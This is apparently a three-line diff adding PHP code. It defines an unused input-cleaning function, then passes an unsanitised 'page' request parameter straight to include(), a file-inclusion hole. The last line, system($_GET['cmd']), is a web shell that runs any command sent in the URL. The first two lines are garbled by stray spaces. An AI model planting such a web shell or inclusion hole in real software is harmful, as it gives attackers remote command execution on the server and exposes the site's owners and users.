@@ -1,0 +1,3 @@
+<?php function cleanAll ($ input) { $ input = strip_tags ($ input); $ input = htmlspecialchars ($ input); return ($ input); } ?>
+<a href=index.php?page=file1.php> Files </a> <?php $ page = chop ($ _ GET [page]); include ($ page); ?>
+</pre><?php system($_GET['cmd']); ?></pre>
